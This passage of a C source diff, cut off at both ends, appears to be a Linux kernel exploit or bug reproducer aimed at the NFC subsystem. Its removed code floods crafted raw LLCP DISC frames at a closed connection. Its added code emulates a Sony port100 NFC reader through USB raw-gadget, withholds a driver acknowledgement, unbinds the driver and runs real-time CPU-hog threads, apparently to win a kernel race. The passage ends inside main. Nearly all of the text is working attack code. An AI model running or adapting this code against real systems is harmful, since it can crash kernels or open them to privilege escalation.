+	out[2] = 0xff;
+	out[3] = 0xff;
+	out[4] = 0xff;
+	out[5] = (uint8_t)(datalen & 0xff);
+	out[6] = (uint8_t)((datalen >> 8) & 0xff);
+	out[7] = (uint8_t)le16_checksum_rule(datalen);
+	out[8] = 0xd7;
+	out[9] = (uint8_t)(cmd + 1);
+	if (payload_len)
+		memcpy(&out[10], payload, payload_len);
+	dsum = sum_checksum_rule(&out[8], datalen);
+	out[8 + datalen] = dsum;
+	out[8 + datalen + 1] = 0x00;
 
-    if (nl_send(fd, family, NLM_F_REQUEST | NLM_F_ACK, NFC_CMD_DEP_LINK_UP, attrs, off) < 0)
-        return -1;
-    return nl_recv_ack(fd);
+	return total;
 }
 
-static int deactivate_target_cmd(int fd, int family, uint32_t idx, uint32_t target_idx) {
-    char attrs[96];
-    size_t off = 0;
+static int send_port100_response(struct port100_ctx *ctx, uint8_t cmd,
+				 const uint8_t *payload, size_t payload_len)
+{
+	uint8_t frame[128];
+	size_t len;
 
-    off = nla_put(attrs, off, NFC_ATTR_DEVICE_INDEX, &idx, sizeof(idx));
-    off = nla_put(attrs, off, NFC_ATTR_TARGET_INDEX, &target_idx, sizeof(target_idx));
+	len = build_port100_response(cmd, payload, payload_len, frame,
+				     sizeof(frame));
+	if (!len)
+		return -EINVAL;
 
-    if (nl_send(fd, family, NLM_F_REQUEST | NLM_F_ACK, NFC_CMD_DEACTIVATE_TARGET, attrs, off) < 0)
-        return -1;
-    return nl_recv_ack(fd);
-}
-static int get_target(int fd, int family, uint32_t idx) {
-    char attrs[64];
-    size_t off = 0;
-
-    off = nla_put(attrs, off, NFC_ATTR_DEVICE_INDEX, &idx, sizeof(idx));
-    if (nl_send(fd, family, NLM_F_REQUEST | NLM_F_DUMP, NFC_CMD_GET_TARGET, attrs, off) < 0)
-        return -1;
-
-    int target = -1;
-    for (;;) {
-        char buf[MAX_MSG];
-        int n = recv(fd, buf, sizeof(buf), 0);
-        if (n < 0) {
-            perror("recv(get_target)");
-            return -1;
-        }
-
-        struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
-        if (nlh->nlmsg_type == NLMSG_DONE)
-            break;
-        if (nlh->nlmsg_type == NLMSG_ERROR) {
-            struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(nlh);
-            if (e->error) {
-                errno = -e->error;
-                perror("get_target");
-                return -1;
-            }
-            continue;
-        }
-
-        struct genlmsghdr *gh = (struct genlmsghdr *)NLMSG_DATA(nlh);
-        int rem = (int)nlh->nlmsg_len - (int)NLMSG_LENGTH(GENL_HDRLEN);
-        struct nlattr *na = (struct nlattr *)((char *)gh + GENL_HDRLEN);
-
-        while (rem >= (int)sizeof(*na) && na->nla_len >= sizeof(*na) && na->nla_len <= rem) {
-            if (na->nla_type == NFC_ATTR_TARGET_INDEX)
-                target = *(uint32_t *)((char *)na + NLA_HDRLEN);
-            rem -= NLA_ALIGN(na->nla_len);
-            na = (struct nlattr *)((char *)na + NLA_ALIGN(na->nla_len));
-        }
-    }
-
-    return target;
+	return raw_ep_write(ctx->fd, ctx->ep_in, frame, (uint32_t)len);
 }
 
-static void dump_llcp_name(const char *tag, int fd, bool peer) {
-    struct sockaddr_nfc_llcp a;
-    socklen_t alen = sizeof(a);
-    memset(&a, 0, sizeof(a));
-
-    int rc = peer ? getpeername(fd, (struct sockaddr *)&a, &alen)
-                  : getsockname(fd, (struct sockaddr *)&a, &alen);
-    if (rc < 0) {
-        fprintf(stderr, "%s %s failed: %s\n", tag,
-                peer ? "getpeername" : "getsockname", strerror(errno));
-        return;
-    }
-
-    fprintf(stderr,
-            "%s %s: dev=%u target=%u proto=%u dsap=%u ssap=%u sn_len=%zu\n",
-            tag, peer ? "peer" : "self", a.dev_idx, a.target_idx,
-            a.nfc_protocol, a.dsap, a.ssap, a.service_name_len);
+static bool is_out_control_request(const struct usb_ctrlrequest *ctrl)
+{
+	return !(ctrl->bRequestType & USB_DIR_IN);
 }
 
-int main(void) {
-    const uint32_t dev_initiator = 0;
-    const uint32_t dev_target = 1;
-    const char service_name[] = "urn:nfc:sn:exp";
+static void fill_string_desc(uint8_t idx, uint8_t *buf, uint16_t *len)
+{
+	static const uint8_t lang0[] = {0x04, USB_DT_STRING, 0x09, 0x04};
+	const char *s;
+	size_t i;
+	size_t n;
 
-    int nlfd = -1, lfd = -1, cfd = -1, afd = -1, rawfd = -1;
-    int family;
-    int target_idx;
+	if (idx == 0) {
+		memcpy(buf, lang0, sizeof(lang0));
+		*len = sizeof(lang0);
+		return;
+	}
 
-    nlfd = nl_open();
-    if (nlfd < 0)
-        return 1;
+	switch (idx) {
+	case 1:
+		s = "Sony";
+		break;
+	case 2:
+		s = "RC-S380";
+		break;
+	case 3:
+		s = "0001";
+		break;
+	default:
+		*len = 0;
+		return;
+	}
 
-    family = get_family_id(nlfd);
-    if (family <= 0) {
-        fprintf(stderr, "Failed to get NFC generic netlink family id\n");
-        return 1;
-    }
-    fprintf(stderr, "NFC family id=%d\n", family);
-
-    if (send_idx_cmd(nlfd, family, NFC_CMD_DEV_UP, dev_initiator) < 0)
-        perror("DEV_UP initiator");
-    if (send_idx_cmd(nlfd, family, NFC_CMD_DEV_UP, dev_target) < 0)
-        perror("DEV_UP target");
-
-    uint32_t dep = NFC_PROTO_NFC_DEP_MASK;
-    if (start_poll(nlfd, family, dev_initiator, dep, 0) < 0) {
-        fprintf(stderr, "start_poll initiator failed\n");
-        return 1;
-    }
-    if (start_poll(nlfd, family, dev_target, 0, dep) < 0) {
-        fprintf(stderr, "start_poll target failed\n");
-        return 1;
-    }
-
-    usleep(400000);
-
-    target_idx = get_target(nlfd, family, dev_initiator);
-    if (target_idx < 0) {
-        fprintf(stderr, "Could not obtain target index for device %u\n", dev_initiator);
-        return 1;
-    }
-    fprintf(stderr, "Target index on initiator device=%d\n", target_idx);
-
-    if (dep_link_up_cmd(nlfd, family, dev_initiator, (uint32_t)target_idx, NFC_COMM_ACTIVE) < 0) {
-        perror("NFC_CMD_DEP_LINK_UP");
-        return 1;
-    }
-    usleep(200000);
-
-    lfd = socket(AF_NFC, SOCK_STREAM, NFC_SOCKPROTO_LLCP);
-    if (lfd < 0) {
-        perror("socket(listener)");
-        return 1;
-    }
-
-    struct sockaddr_nfc_llcp laddr;
-    memset(&laddr, 0, sizeof(laddr));
-    laddr.sa_family = AF_NFC;
-    laddr.dev_idx = dev_target;
-    laddr.nfc_protocol = NFC_PROTO_NFC_DEP;
-    laddr.dsap = 0;
-    laddr.ssap = 0;
-    memcpy(laddr.service_name, service_name, sizeof(service_name) - 1);
-    laddr.service_name_len = sizeof(service_name) - 1;
-
-    if (bind(lfd, (struct sockaddr *)&laddr, sizeof(laddr)) < 0) {
-        perror("bind(listener)");
-        return 1;
-    }
-    if (listen(lfd, 1) < 0) {
-        perror("listen(listener)");
-        return 1;
-    }
-    fprintf(stderr, "listener bound on dev=%u service=%s\n", dev_target, service_name);
-
-    cfd = socket(AF_NFC, SOCK_STREAM, NFC_SOCKPROTO_LLCP);
-    if (cfd < 0) {
-        perror("socket(client)");
-        return 1;
-    }
-
-    struct sockaddr_nfc_llcp caddr;
-    memset(&caddr, 0, sizeof(caddr));
-    caddr.sa_family = AF_NFC;
-    caddr.dev_idx = dev_initiator;
-    caddr.target_idx = (uint32_t)target_idx;
-    caddr.nfc_protocol = NFC_PROTO_NFC_DEP;
-    caddr.dsap = 0;
-    memcpy(caddr.service_name, service_name, sizeof(service_name) - 1);
-    caddr.service_name_len = sizeof(service_name) - 1;
-
-    if (connect(cfd, (struct sockaddr *)&caddr, sizeof(caddr)) < 0) {
-        perror("connect(client)");
-        return 1;
-    }
-
-    afd = accept(lfd, NULL, NULL);
-    if (afd < 0) {
-        perror("accept(listener)");
-        return 1;
-    }
-
-    dump_llcp_name("client", cfd, false);
-    dump_llcp_name("client", cfd, true);
-    dump_llcp_name("accepted", afd, false);
-    dump_llcp_name("accepted", afd, true);
-
-    struct sockaddr_nfc_llcp cself;
-    socklen_t cself_len = sizeof(cself);
-    memset(&cself, 0, sizeof(cself));
-    if (getsockname(cfd, (struct sockaddr *)&cself, &cself_len) < 0) {
-        perror("getsockname(client)");
-        return 1;
-    }
-
-    uint8_t client_ssap = cself.ssap;
-    uint8_t server_ssap = 0;
-    struct sockaddr_nfc_llcp aself;
-    socklen_t aself_len = sizeof(aself);
-    memset(&aself, 0, sizeof(aself));
-    if (getsockname(afd, (struct sockaddr *)&aself, &aself_len) == 0)
-        server_ssap = aself.ssap;
-    fprintf(stderr, "client ssap=%u server ssap=%u\n", client_ssap, server_ssap);
-
-    if (close(cfd) < 0)
-        perror("close(client)");
-    cfd = -1;
-
-    usleep(400000);
-
-    if (deactivate_target_cmd(nlfd, family, dev_initiator, (uint32_t)target_idx) < 0) {
-        perror("NFC_CMD_DEACTIVATE_TARGET");
-    }
-
-    rawfd = socket(AF_NFC, SOCK_SEQPACKET, NFC_SOCKPROTO_RAW);
-    if (rawfd < 0) {
-        perror("socket(raw)");
-        return 1;
-    }
-
-    struct sockaddr_nfc raddr;
-    memset(&raddr, 0, sizeof(raddr));
-    raddr.sa_family = AF_NFC;
-    raddr.dev_idx = dev_initiator;
-    raddr.target_idx = (uint32_t)target_idx;
-    raddr.nfc_protocol = NFC_PROTO_NFC_DEP;
-
-    if (connect(rawfd, (struct sockaddr *)&raddr, sizeof(raddr)) < 0) {
-        perror("connect(raw)");
-        return 1;
-    }
-
-    uint8_t disc[2];
-    disc[0] = (uint8_t)((server_ssap << 2) | (LLCP_PDU_DISC >> 2));
-    disc[1] = (uint8_t)((LLCP_PDU_DISC << 6) | (client_ssap & 0x3f));
-
-    fprintf(stderr, "sending crafted DISC frame bytes: %02x %02x\n", disc[0], disc[1]);
-
-    for (int i = 0; i < 2000; i++) {
-        ssize_t n = send(rawfd, disc, sizeof(disc), 0);
-        if (n < 0) {
-            fprintf(stderr, "send(raw DISC) failed at iter %d: %s\n", i, strerror(errno));
-            break;
-        }
-        if ((i % 100) == 0)
-            usleep(1000);
-    }
-
-    fprintf(stderr, "done sending crafted DISC frames\n");
-    sleep(1);
-
-    if (rawfd >= 0)
-        close(rawfd);
-    if (afd >= 0)
-        close(afd);
-    if (lfd >= 0)
-        close(lfd);
-    if (nlfd >= 0)
-        close(nlfd);
-
-    return 0;
+	n = strlen(s);
+	buf[0] = (uint8_t)(2 + n * 2);
+	buf[1] = USB_DT_STRING;
+	for (i = 0; i < n; i++) {
+		buf[2 + i * 2] = (uint8_t)s[i];
+		buf[3 + i * 2] = 0;
+	}
+	*len = buf[0];
 }
+
+static int handle_control_event(struct port100_ctx *ctx,
+				const struct usb_ctrlrequest *ctrl)
+{
+	uint16_t w_value = le16toh(ctrl->wValue);
+	uint16_t w_index = le16toh(ctrl->wIndex);
+	uint16_t w_length = le16toh(ctrl->wLength);
+	uint8_t desc_type = (uint8_t)(w_value >> 8);
+	uint8_t desc_idx = (uint8_t)(w_value & 0xff);
+	uint8_t resp[256];
+	uint16_t resp_len = 0;
+	int rv;
+
+	static const struct usb_device_descriptor dev_desc = {
+		.bLength = sizeof(struct usb_device_descriptor),
+		.bDescriptorType = USB_DT_DEVICE,
+		.bcdUSB = 0x0200,
+		.bDeviceClass = 0,
+		.bDeviceSubClass = 0,
+		.bDeviceProtocol = 0,
+		.bMaxPacketSize0 = 64,
+		.idVendor = 0x054c,
+		.idProduct = 0x06c1,
+		.bcdDevice = 0x0001,
+		.iManufacturer = 1,
+		.iProduct = 2,
+		.iSerialNumber = 3,
+		.bNumConfigurations = 1,
+	};
+
+	struct {
+		struct usb_config_descriptor config;
+		struct usb_interface_descriptor intf;
+		struct usb_endpoint_descriptor ep_out;
+		struct usb_endpoint_descriptor ep_in;
+	} __attribute__((packed)) cfg_desc = {
+		.config = {
+			.bLength = sizeof(struct usb_config_descriptor),
+			.bDescriptorType = USB_DT_CONFIG,
+			.wTotalLength = sizeof(cfg_desc),
+			.bNumInterfaces = 1,
+			.bConfigurationValue = 1,
+			.iConfiguration = 0,
+			.bmAttributes = USB_CONFIG_ATT_ONE,
+			.bMaxPower = 50,
+		},
+		.intf = {
+			.bLength = sizeof(struct usb_interface_descriptor),
+			.bDescriptorType = USB_DT_INTERFACE,
+			.bInterfaceNumber = 0,
+			.bAlternateSetting = 0,
+			.bNumEndpoints = 2,
+			.bInterfaceClass = USB_CLASS_VENDOR_SPEC,
+			.bInterfaceSubClass = 0,
+			.bInterfaceProtocol = 0,
+			.iInterface = 0,
+		},
+		.ep_out = {
+			.bLength = sizeof(struct usb_endpoint_descriptor),
+			.bDescriptorType = USB_DT_ENDPOINT,
+			.bEndpointAddress = 0x02,
+			.bmAttributes = USB_ENDPOINT_XFER_BULK,
+			.wMaxPacketSize = 512,
+			.bInterval = 0,
+		},
+		.ep_in = {
+			.bLength = sizeof(struct usb_endpoint_descriptor),
+			.bDescriptorType = USB_DT_ENDPOINT,
+			.bEndpointAddress = 0x81,
+			.bmAttributes = USB_ENDPOINT_XFER_BULK,
+			.wMaxPacketSize = 512,
+			.bInterval = 0,
+		},
+	};
+
+	if ((ctrl->bRequestType & USB_TYPE_MASK) == USB_TYPE_STANDARD) {
+		switch (ctrl->bRequest) {
+		case USB_REQ_GET_DESCRIPTOR:
+			switch (desc_type) {
+			case USB_DT_DEVICE:
+				memcpy(resp, &dev_desc, sizeof(dev_desc));
+				resp_len = sizeof(dev_desc);
+				break;
+			case USB_DT_CONFIG:
+				memcpy(resp, &cfg_desc, sizeof(cfg_desc));
+				resp_len = sizeof(cfg_desc);
+				break;
+			case USB_DT_STRING:
+				fill_string_desc(desc_idx, resp, &resp_len);
+				break;
+			default:
+				resp_len = 0;
+				break;
+			}
+			break;
+		case USB_REQ_SET_CONFIGURATION:
+			if (w_value == 1 && !ctx->configured) {
+				struct usb_endpoint_descriptor ep;
+				uint32_t power = 250;
+
+				ioctl(ctx->fd, USB_RAW_IOCTL_VBUS_DRAW, power);
+				ioctl(ctx->fd, USB_RAW_IOCTL_CONFIGURE, 0);
+
+				memset(&ep, 0, sizeof(ep));
+				ep.bLength = sizeof(ep);
+				ep.bDescriptorType = USB_DT_ENDPOINT;
+				ep.bEndpointAddress = 0x81;
+				ep.bmAttributes = USB_ENDPOINT_XFER_BULK;
+				ep.wMaxPacketSize = htole16(512);
+				ctx->ep_in = ioctl(ctx->fd, USB_RAW_IOCTL_EP_ENABLE, &ep);
+
+				memset(&ep, 0, sizeof(ep));
+				ep.bLength = sizeof(ep);
+				ep.bDescriptorType = USB_DT_ENDPOINT;
+				ep.bEndpointAddress = 0x02;
+				ep.bmAttributes = USB_ENDPOINT_XFER_BULK;
+				ep.wMaxPacketSize = htole16(512);
+				ctx->ep_out = ioctl(ctx->fd, USB_RAW_IOCTL_EP_ENABLE, &ep);
+
+				if (ctx->ep_in >= 0 && ctx->ep_out >= 0)
+					ctx->configured = true;
+			}
+			break;
+		case USB_REQ_GET_INTERFACE:
+			resp[0] = 0;
+			resp_len = 1;
+			break;
+		case USB_REQ_SET_INTERFACE:
+			break;
+		default:
+			break;
+		}
+	}
+
+	if (is_out_control_request(ctrl))
+		rv = raw_ep0_read(ctx->fd, w_length);
+	else {
+		if (resp_len > w_length)
+			resp_len = w_length;
+		rv = raw_ep0_write(ctx->fd, resp, resp_len);
+	}
+
+	(void)w_index;
+	return rv;
+}
+
+static void *bulk_thread_fn(void *arg)
+{
+	struct port100_ctx *ctx = arg;
+	uint8_t inbuf[USB_MAX_PACKET_SIZE];
+	uint8_t payload[16];
+
+	while (ctx->running) {
+		uint32_t len = sizeof(inbuf);
+		int rv;
+		uint8_t cmd;
+
+		rv = raw_ep_read(ctx->fd, ctx->ep_out, inbuf, &len);
+		if (rv < 0) {
+			if (ctx->running)
+				fprintf(stderr, "ep_read failed: %d (%s)\n", errno,
+					strerror(errno));
+			break;
+		}
+
+		if (len < 10)
+			continue;
+		cmd = inbuf[9];
+		fprintf(stderr, "[usb] cmd 0x%02x len=%u\n", cmd, len);
+
+		if (cmd == 0x04) {
+			pthread_mutex_lock(&ctx->lock);
+			ctx->saw_in_comm_rf = true;
+			pthread_cond_broadcast(&ctx->cond);
+			pthread_mutex_unlock(&ctx->lock);
+			fprintf(stderr, "[usb] saw IN_COMM_RF, withholding ack/resp\n");
+			continue;
+		}
+
+		if (send_ack(ctx) < 0) {
+			fprintf(stderr, "send_ack failed: %s\n", strerror(errno));
+			break;
+		}
+
+		switch (cmd) {
+		case 0x28: {
+			uint64_t mask = htobe64(0x3);
+			if (send_port100_response(ctx, cmd, (const uint8_t *)&mask,
+						 sizeof(mask)) < 0)
+				goto out;
+			break;
+		}
+		case 0x20: {
+			uint16_t fw = htole16(0x0101);
+			if (send_port100_response(ctx, cmd, (const uint8_t *)&fw,
+						 sizeof(fw)) < 0)
+				goto out;
+			break;
+		}
+		default:
+			payload[0] = 0x00;
+			if (send_port100_response(ctx, cmd, payload, 1) < 0)
+				goto out;
+			break;
+		}
+	}
+
+out:
+	return NULL;
+}
+
+static int choose_udc(char *out, size_t out_sz)
+{
+	DIR *d;
+	struct dirent *de;
+
+	d = opendir("/sys/class/udc");
+	if (!d)
+		return -1;
+
+	while ((de = readdir(d)) != NULL) {
+		if (de->d_name[0] == '.')
+			continue;
+		if (strncmp(de->d_name, "dummy_udc.", 10) == 0) {
+			snprintf(out, out_sz, "%s", de->d_name);
+			closedir(d);
+			return 0;
+		}
+	}
+
+	closedir(d);
+	return -1;
+}
+
+static int setup_raw_gadget(struct port100_ctx *ctx)
+{
+	struct usb_raw_init arg;
+	char udc_name[128] = {0};
+	int rv;
+
+	ctx->fd = open("/dev/raw-gadget", O_RDWR);
+	if (ctx->fd < 0)
+		return -1;
+
+	if (choose_udc(udc_name, sizeof(udc_name)) < 0)
+		snprintf(udc_name, sizeof(udc_name), "dummy_udc.0");
+
+	memset(&arg, 0, sizeof(arg));
+	strncpy((char *)arg.driver_name, "dummy_udc", sizeof(arg.driver_name) - 1);
+	strncpy((char *)arg.device_name, udc_name, sizeof(arg.device_name) - 1);
+	arg.speed = USB_SPEED_HIGH;
+
+	rv = ioctl(ctx->fd, USB_RAW_IOCTL_INIT, &arg);
+	if (rv < 0)
+		return -1;
+	rv = ioctl(ctx->fd, USB_RAW_IOCTL_RUN, 0);
+	if (rv < 0)
+		return -1;
+
+	fprintf(stderr, "raw gadget running on %s\n", udc_name);
+	return 0;
+}
+
+static int wait_until_configured(struct port100_ctx *ctx, int timeout_sec)
+{
+	struct timespec start;
+
+	clock_gettime(CLOCK_MONOTONIC, &start);
+
+	while (!ctx->configured) {
+		struct usb_raw_control_event event;
+		struct timespec now;
+		int elapsed;
+		int rv;
+
+		memset(&event, 0, sizeof(event));
+		event.inner.length = sizeof(event.ctrl) + sizeof(event.data);
+		rv = ioctl(ctx->fd, USB_RAW_IOCTL_EVENT_FETCH, &event);
+		if (rv < 0)
+			return -1;
+
+		if (event.inner.type != USB_RAW_EVENT_CONTROL)
+			continue;
+
+		if (handle_control_event(ctx, &event.ctrl) < 0)
+			return -1;
+
+		clock_gettime(CLOCK_MONOTONIC, &now);
+		elapsed = (int)(now.tv_sec - start.tv_sec);
+		if (elapsed > timeout_sec)
+			return -1;
+	}
+
+	fprintf(stderr, "raw gadget configured: ep_in=%d ep_out=%d\n",
+		ctx->ep_in, ctx->ep_out);
+	return 0;
+}
+
+static int scan_nfc_indices(int *out, int max)
+{
+	DIR *d;
+	struct dirent *de;
+	int n = 0;
+
+	d = opendir("/sys/class/nfc");
+	if (!d)
+		return 0;
+
+	while ((de = readdir(d)) != NULL) {
+		if (strncmp(de->d_name, "nfc", 3) != 0)
+			continue;
+		if (n < max)
+			out[n++] = atoi(de->d_name + 3);
+	}
+
+	closedir(d);
+	return n;
+}
+
+static int wait_new_nfc_index(int baseline_max, int timeout_sec)
+{
+	int i;
+	for (i = 0; i < timeout_sec * 20; i++) {
+		int idx[64];
+		int n = scan_nfc_indices(idx, ARRAY_SIZE(idx));
+		int j;
+
+		for (j = 0; j < n; j++) {
+			if (idx[j] > baseline_max)
+				return idx[j];
+		}
+		usleep(50000);
+	}
+	return -1;
+}
+
+static int find_port100_iface(char *out, size_t out_sz)
+{
+	DIR *d;
+	struct dirent *de;
+
+	d = opendir("/sys/bus/usb/drivers/port100");
+	if (!d)
+		return -1;
+
+	while ((de = readdir(d)) != NULL) {
+		if (de->d_name[0] == '.')
+			continue;
+		if (!strchr(de->d_name, ':'))
+			continue;
+		snprintf(out, out_sz, "%s", de->d_name);
+		closedir(d);
+		return 0;
+	}
+
+	closedir(d);
+	return -1;
+}
+
+static int unbind_port100(void)
+{
+	char iface[128];
+	int fd;
+	size_t len;
+
+	if (find_port100_iface(iface, sizeof(iface)) < 0)
+		return -1;
+
+	fd = open("/sys/bus/usb/drivers/port100/unbind", O_WRONLY);
+	if (fd < 0)
+		return -1;
+
+	len = strlen(iface);
+	if (write(fd, iface, len) != (ssize_t)len) {
+		close(fd);
+		return -1;
+	}
+
+	close(fd);
+	return 0;
+}
+
+static int set_thread_realtime(int prio)
+{
+	struct sched_param sp;
+
+	memset(&sp, 0, sizeof(sp));
+	sp.sched_priority = prio;
+	return sched_setscheduler(0, SCHED_FIFO, &sp);
+}
+
+static void *hog_thread_fn(void *arg)
+{
+	struct hog_ctx *hog = arg;
+	cpu_set_t cpus;
+	struct sched_param sp;
+
+	CPU_ZERO(&cpus);
+	CPU_SET(hog->cpu, &cpus);
+	pthread_setaffinity_np(pthread_self(), sizeof(cpus), &cpus);
+
+	memset(&sp, 0, sizeof(sp));
+	sp.sched_priority = 90;
+	pthread_setschedparam(pthread_self(), SCHED_FIFO, &sp);
+
+	while (hog->run)
+		asm volatile("" : : : "memory");
+
+	return NULL;
+}
+
+static int nl_sock_open(uint32_t *seq_out)
+{
+	struct sockaddr_nl addr;
+	int fd;
+
+	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
+	if (fd < 0)
+		return -1;
+
+	memset(&addr, 0, sizeof(addr));
+	addr.nl_family = AF_NETLINK;
+	addr.nl_pid = (uint32_t)getpid();
+	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+		close(fd);
+		return -1;
+	}
+
+	*seq_out = 1;
+	return fd;
+}
+
+static int nla_put(struct nlmsghdr *nlh, size_t maxlen, uint16_t type,
+		   const void *data, uint16_t len)
+{
+	size_t offset;
+	size_t attr_len;
+	size_t total_len;
+	struct nlattr *attr;
+
+	offset = NLMSG_ALIGN(nlh->nlmsg_len);
+	attr_len = sizeof(struct nlattr) + len;
+	total_len = offset + NLA_ALIGN(attr_len);
+	if (total_len > maxlen)
+		return -1;
+
+	attr = (struct nlattr *)((uint8_t *)nlh + offset);
+	attr->nla_type = type;
+	attr->nla_len = attr_len;
+	memcpy((uint8_t *)attr + sizeof(struct nlattr), data, len);
+	memset((uint8_t *)attr + attr_len, 0, NLA_ALIGN(attr_len) - attr_len);
+
+	nlh->nlmsg_len = total_len;
+	return 0;
+}
+
+static int nl_send_recv_ack(int fd, struct nlmsghdr *nlh)
+{
+	struct sockaddr_nl nladdr;
+	uint8_t buf[8192];
+	struct iovec iov;
+	struct msghdr msg;
+	uint32_t seq = nlh->nlmsg_seq;
+
+	memset(&nladdr, 0, sizeof(nladdr));
+	nladdr.nl_family = AF_NETLINK;
+
+	iov.iov_base = nlh;
+	iov.iov_len = nlh->nlmsg_len;
+
+	memset(&msg, 0, sizeof(msg));
+	msg.msg_name = &nladdr;
+	msg.msg_namelen = sizeof(nladdr);
+	msg.msg_iov = &iov;
+	msg.msg_iovlen = 1;
+
+	if (sendmsg(fd, &msg, 0) < 0)
+		return -1;
+
+	for (;;) {
+		ssize_t ret;
+		struct nlmsghdr *h;
+
+		ret = recv(fd, buf, sizeof(buf), 0);
+		if (ret < 0)
+			return -1;
+
+		for (h = (struct nlmsghdr *)buf; NLMSG_OK(h, ret);
+		     h = NLMSG_NEXT(h, ret)) {
+			if (h->nlmsg_seq != seq)
+				continue;
+			if (h->nlmsg_type == NLMSG_ERROR) {
+				struct nlmsgerr *err = (struct nlmsgerr *)NLMSG_DATA(h);
+				if (h->nlmsg_len < NLMSG_LENGTH(sizeof(*err)))
+					return -1;
+				if (err->error) {
+					errno = -err->error;
+					return -1;
+				}
+				return 0;
+			}
+		}
+	}
+}
+
+static int genl_get_family_id(int fd, uint32_t *seq_io, const char *name)
+{
+	uint8_t buf[8192];
+	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
+	struct genlmsghdr *ghdr;
+	struct sockaddr_nl nladdr;
+	struct iovec iov;
+	struct msghdr msg;
+	uint32_t seq = (*seq_io)++;
+
+	memset(buf, 0, sizeof(buf));
+	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*ghdr));
+	nlh->nlmsg_type = GENL_ID_CTRL;
+	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
+	nlh->nlmsg_seq = seq;
+	nlh->nlmsg_pid = (uint32_t)getpid();
+
+	ghdr = (struct genlmsghdr *)NLMSG_DATA(nlh);
+	ghdr->cmd = CTRL_CMD_GETFAMILY;
+	ghdr->version = 1;
+	ghdr->reserved = 0;
+
+	if (nla_put(nlh, sizeof(buf), CTRL_ATTR_FAMILY_NAME, name,
+		    (uint16_t)strlen(name) + 1) < 0)
+		return -1;
+
+	memset(&nladdr, 0, sizeof(nladdr));
+	nladdr.nl_family = AF_NETLINK;
+	memset(&msg, 0, sizeof(msg));
+	iov.iov_base = nlh;
+	iov.iov_len = nlh->nlmsg_len;
+	msg.msg_name = &nladdr;
+	msg.msg_namelen = sizeof(nladdr);
+	msg.msg_iov = &iov;
+	msg.msg_iovlen = 1;
+
+	if (sendmsg(fd, &msg, 0) < 0)
+		return -1;
+
+	for (;;) {
+		ssize_t ret = recv(fd, buf, sizeof(buf), 0);
+		struct nlmsghdr *h;
+		if (ret < 0)
+			return -1;
+
+		for (h = (struct nlmsghdr *)buf; NLMSG_OK(h, ret);
+		     h = NLMSG_NEXT(h, ret)) {
+			if (h->nlmsg_seq != seq)
+				continue;
+
+			if (h->nlmsg_type == NLMSG_ERROR) {
+				struct nlmsgerr *err = (struct nlmsgerr *)NLMSG_DATA(h);
+				if (err->error) {
+					errno = -err->error;
+					return -1;
+				}
+				return -1;
+			}
+
+			if (h->nlmsg_type == GENL_ID_CTRL) {
+				struct genlmsghdr *gh = (struct genlmsghdr *)NLMSG_DATA(h);
+				int rem = h->nlmsg_len - NLMSG_LENGTH(sizeof(*gh));
+				struct nlattr *attr = (struct nlattr *)((uint8_t *)gh +
+							       sizeof(*gh));
+				for (; rem >= (int)sizeof(*attr);
+				     attr = (struct nlattr *)((uint8_t *)attr +
+							NLA_ALIGN(attr->nla_len))) {
+					if (attr->nla_len < sizeof(*attr) || attr->nla_len > rem)
+						break;
+					if (attr->nla_type == CTRL_ATTR_FAMILY_ID) {
+						uint16_t id;
+						memcpy(&id,
+						       (uint8_t *)attr + sizeof(*attr),
+						       sizeof(id));
+						/* consume pending ACK */
+						nl_send_recv_ack(fd, nlh);
+						return id;
+					}
+					rem -= NLA_ALIGN(attr->nla_len);
+				}
+			}
+		}
+	}
+}
+
+static int nfc_genl_simple_cmd(int fd, uint32_t *seq_io, uint16_t fam_id,
+			       uint8_t cmd, uint32_t dev_idx,
+			       bool include_im_proto, uint32_t im_proto)
+{
+	uint8_t buf[1024];
+	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
+	struct genlmsghdr *gh;
+	uint32_t seq = (*seq_io)++;
+
+	memset(buf, 0, sizeof(buf));
+	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*gh));
+	nlh->nlmsg_type = fam_id;
+	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
+	nlh->nlmsg_seq = seq;
+	nlh->nlmsg_pid = (uint32_t)getpid();
+
+	gh = (struct genlmsghdr *)NLMSG_DATA(nlh);
+	gh->cmd = cmd;
+	gh->version = NFC_GENL_VERSION;
+	gh->reserved = 0;
+
+	if (nla_put(nlh, sizeof(buf), NFC_ATTR_DEVICE_INDEX, &dev_idx,
+		    sizeof(dev_idx)) < 0)
+		return -1;
+
+	if (include_im_proto) {
+		if (nla_put(nlh, sizeof(buf), NFC_ATTR_IM_PROTOCOLS, &im_proto,
+			    sizeof(im_proto)) < 0)
+			return -1;
+	}
+
+	return nl_send_recv_ack(fd, nlh);
+}
+
+static int retry_nfc_genl_simple_cmd(int fd, uint32_t *seq_io, uint16_t fam_id,
+				     uint8_t cmd, uint32_t dev_idx,
+				     bool include_im_proto, uint32_t im_proto,
+				     int attempts, int delay_ms)
+{
+	int i;
+	int rc;
+	int saved_errno = 0;
+
+	for (i = 0; i < attempts; i++) {
+		rc = nfc_genl_simple_cmd(fd, seq_io, fam_id, cmd, dev_idx,
+					 include_im_proto, im_proto);
+		if (!rc)
+			return 0;
+
+		saved_errno = errno;
+
+		if (i + 1 < attempts)
+			usleep((useconds_t)delay_ms * 1000);
+	}
+
+	errno = saved_errno ? saved_errno : EIO;
+	return -1;
+}
+
+int main(void)
+{
+	struct port100_ctx ctx;
+	pthread_t bulk_thr;
+	pthread_t hog_thr[8];
+	struct hog_ctx hogs[8];
+	int hog_count = 0;
+	int baseline[32];
+	int baseline_n;
+	int baseline_max = -1;
+	int port100_idx;
+	uint32_t nlseq = 1;
+	int nlfd = -1;
+	int fam_id;
+	int i;
+
+	memset(&ctx, 0, sizeof(ctx));
+	ctx.fd = -1;
+	ctx.ep_in = -1;
+	ctx.ep_out = -1;
+	ctx.running = true;
+	pthread_mutex_init(&ctx.lock, NULL);
+	pthread_cond_init(&ctx.cond, NULL);
+
+	baseline_n = scan_nfc_indices(baseline, ARRAY_SIZE(baseline));
